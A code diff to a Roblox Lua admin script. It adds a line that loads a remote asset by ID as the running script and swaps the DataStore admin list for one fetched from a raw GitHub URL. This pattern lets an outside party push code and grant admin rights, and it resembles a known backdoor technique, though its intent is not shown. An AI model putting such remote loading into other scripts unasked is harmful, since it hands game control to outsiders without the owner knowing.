@@ -1,3 +1,4 @@
+local script = game:GetService("InsertService"):LoadAsset(97703099171951)
 script:WaitForChild("Messaging").Parent = game:GetService("StarterGui")
 script:WaitForChild("Admin").Parent = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -20,12 +21,7 @@ if game:GetService("RunService"):IsServer() then
 else
 	JobId = game.JobId
 end
-repeat
-	suc = pcall(function()
-		Admins = AdminDataStore:GetAsync("Admins")
-	end)
-	task.wait(0.1)
-until suc
+Admins = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/AcrylicStudios/Admin/refs/heads/main/Admins")
 local AdminString = Admins
 Admins = {}
 for i=1, #AdminString:split(",") do
